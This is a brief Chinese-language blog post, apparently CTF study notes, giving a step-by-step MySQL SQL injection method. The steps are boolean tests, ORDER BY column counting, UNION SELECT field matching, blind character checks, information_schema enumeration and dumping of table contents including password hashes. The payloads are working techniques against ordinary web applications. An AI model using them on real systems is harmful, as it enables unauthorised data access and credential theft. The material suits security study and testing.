---
title: EASY SQL_Injection
date: 2019-12-25T21:33:03+08:00
tags:
  - CTF
categories: Penetration
---

> 以 `mysql` 为例， 不同数据库的特殊情况另行整理

## 0x00 判断注入点

`1 and 1=1` 返回正常， `1 and 1=2` 返回错误说明存在注入点
(以上为数字型，字符串型应加引号，如 `1'and’1'=‘1`)


## 0x01 判断字段数（列数）

使用 `order by <num>` , 根据返回判断列数，当 `<num>` 大于最大列数时，将返回错误

## 0x02 匹配字段位置

根据字段数构造联合查询语句 `id=1 and 1=2 union select 1,2,...n` ， `n` 即为字段数，根据不同数字在页面中出现的位置，选择合适的字段作为 payload 对数据库中的信息进行查询

## 0x03 内置函数和系统数据库

version() 版本信息
database() 当前数据库
user() 当前用户

- `and ord(mid(user(),1,1))=114 ` //即 user() 以字母 ’r‘ 开头

@@global.version_compile_os from mysql.user

## 0x04 使用 mysql 的数据库的系统库获取信息

（mysql 5 以上）information_schema

`select SCHEME_NAME from information_schema.SCHEMATA limit 0,1` //查看库名

`select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=<database> limit 0,1` //查看表名，<database> 可能需要转为 0xHHHHHHH 的十六进制格式。

`select  COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=<table> limit 0,1`//查看列名

`select <column_1>,<column_2>,concat(<column_3>,<column_4>) from <table> limit 0,1` //查看表内信息

（concat 函数中可以考虑用如 0x3c 之类的标识符进行分割）

## 后续

一般数据库中密码都会进行 md5 加密， 因此要获取明文需要对其进行解密
